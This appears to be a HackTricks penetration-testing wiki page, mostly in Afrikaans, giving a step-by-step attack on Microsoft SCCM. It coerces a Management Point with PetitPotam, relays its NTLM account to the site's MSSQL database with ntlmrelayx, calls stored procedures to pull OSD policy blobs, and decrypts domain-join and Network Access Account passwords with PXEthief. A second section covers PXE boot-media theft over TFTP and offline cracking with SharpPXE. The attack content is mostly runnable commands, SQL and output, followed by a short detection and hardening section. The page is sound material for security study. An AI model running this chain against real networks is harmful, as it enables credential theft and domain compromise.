# SCCM Management Point NTLM Relay to SQL – OSD Policy Geheimonttrekking

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Deur 'n **System Center Configuration Manager (SCCM) Management Point (MP)** te dwing om oor SMB/RPC te verifieer en daardie NTLM-masjienrekening te **relay** na die **site database (MSSQL)**, verkry jy `smsdbrole_MP` / `smsdbrole_MPUserSvc` regte. Hierdie rolle laat jou toe om 'n stel stored procedures aan te roep wat **Operating System Deployment (OSD)** policy blobs openbaar (Network Access Account credentials, Task-Sequence variables, ens.). Die blobs is hex-encoded/encrypted maar kan met **PXEthief** gedecodeer en gedekripteer word, wat plain-tekst geheime lewer.

Hoë-vlak ketting:
1. Discover MP & site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Begin `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Dwing MP met behulp van **PetitPotam**, PrinterBug, DFSCoerce, ens.
4. Deur die SOCKS-proxy, koppel met `mssqlclient.py -windows-auth` as die gerelayeerde **<DOMAIN>\\<MP-host>$** rekening.
5. Voer uit:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (of `MP_GetPolicyBodyAfterAuthorization`)
6. Verwyder `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Geheime soos `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, ens. word herstel sonder om PXE of kliënte aan te raak.

---

## 1. Enumerasie van ongeauthentiseerde MP-endpunte
Die MP ISAPI-uitbreiding **GetAuth.dll** openbaar verskeie parameters wat nie verifikasie benodig nie (behalwe as die site slegs PKI is):

| Parameter | Doel |
|-----------|------|
| `MPKEYINFORMATIONMEDIA` | Gee die site-handtekeningsertifikaat publieke sleutel + GUIDs van *x86* / *x64* **All Unknown Computers** toestelle. |
| `MPLIST` | Lys elke Management-Point in die site. |
| `SITESIGNCERT` | Gee die Primary-Site ondertekeningssertifikaat (identifiseer die site-server sonder LDAP). |

Kry die GUIDs wat as die **clientID** sal dien vir later DB-navrae:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Relay die MP machine account na MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Wanneer die coercion afgaan, behoort jy iets soos die volgende te sien:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identifiseer OSD-beleide via stored procedures
Verbind deur die SOCKS-proxy (port 1080 by default):
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Skakel oor na die **CM_<SiteCode>** DB (gebruik die 3-syfer sitekode, bv. `CM_001`).

### 3.1  Vind Unknown-Computer GUIDs (opsioneel)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Lys toegekende beleide
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Elke ry bevat `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion`.

Fokus op beleide:
* **NAAConfig**  – Network Access Account creds
* **TS_Sequence** – Task Sequence variables (OSDJoinAccount/Password)
* **CollectionSettings** – Kan run-as accounts bevat

### 3.3  Haal die volledige Body op
As jy reeds `PolicyID` & `PolicyVersion` het, kan jy die clientID-vereiste oorslaan deur:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> BELANGRIK: In SSMS verhoog “Maximum Characters Retrieved” (>65535) anders sal die blob ingekort word.

---

## 4. Dekodeer & dekripteer die blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Voorbeeld van herwonne geheime:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Relevante SQL-rolle & prosedures
By die relay word die login gekoppel aan:
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Hierdie rolle stel 'n dosyn EXEC-permissies bloot; die belangrikste wat in hierdie attack gebruik word, is:

| Gestoorde prosedure | Doel |
|---------------------|------|
| `MP_GetMachinePolicyAssignments` | Lys beleide wat op 'n `clientID` toegepas is. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Gee die volledige beleidliggaam terug. |
| `MP_GetListOfMPsInSiteOSD` | Teruggegee deur die `MPKEYINFORMATIONMEDIA`-pad. |

Jy kan die volledige lys bekyk met:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. PXE-bootmedia-insameling (SharpPXE)
* **PXE reply over UDP/4011**: stuur 'n PXE-bootversoek na 'n Distribution Point wat vir PXE gekonfigureer is. Die proxyDHCP-antwoord openbaar boot-paadjies soos `SMSBoot\\x64\\pxe\\variables.dat` (encrypted config) en `SMSBoot\\x64\\pxe\\boot.bcd`, plus 'n opsionele encrypted key blob.
* **Retrieve boot artifacts via TFTP**: gebruik die teruggegewe paadjies om `variables.dat` oor TFTP af te laai (unauthenticated). Die lêer is klein (a few KB) en bevat die encrypted media variables.
* **Decrypt or crack**:
- If the response includes the decryption key, feed it to **SharpPXE** to decrypt `variables.dat` directly.
- If no key is provided (PXE media protected by a custom password), SharpPXE emits a **Hashcat-compatible** `$sccm$aes128$...` hash for offline cracking. After recovering the password, decrypt the file.
* **Parse decrypted XML**: die plaintext-variabels bevat SCCM deployment metadata (Management Point URL, Site Code, media GUIDs, en ander identifiseerders). SharpPXE ontleed dit en druk 'n gereed-vir-hardloop **SharpSCCM**-opdrag uit met GUID/PFX/site parameters vooraf ingevul vir opvolg-misbruik.
* **Requirements**: slegs netwerkbereikbaarheid na die PXE-listener (UDP/4011) en TFTP; geen plaaslike admin-regte benodig nie.

---

## 7. Detection & Hardening
1. **Monitor MP logins** – enige MP computerrekening wat vanaf 'n IP aanmeld wat nie sy gasheer is nie ≈ relay.
2. Skakel **Extended Protection for Authentication (EPA)** op die site database in (`PREVENT-14`).
3. Deaktiveer ongebruikte NTLM, dwing SMB signing af, beperk RPC (dieselfde mitigasies gebruik teen `PetitPotam`/`PrinterBug`).
4. Verhard MP ↔ DB-kommunikasie met IPSec / mutual-TLS.
5. **Constrain PXE exposure** – firewall UDP/4011 en TFTP na vertroude VLANs, vereis PXE passwords, en waarsku op TFTP downloads van `SMSBoot\\*\\pxe\\variables.dat`.

---

## See also
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}



## References
- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [SharpPXE](https://github.com/leftp/SharpPXE)
{{#include ../../banners/hacktricks-training.md}}
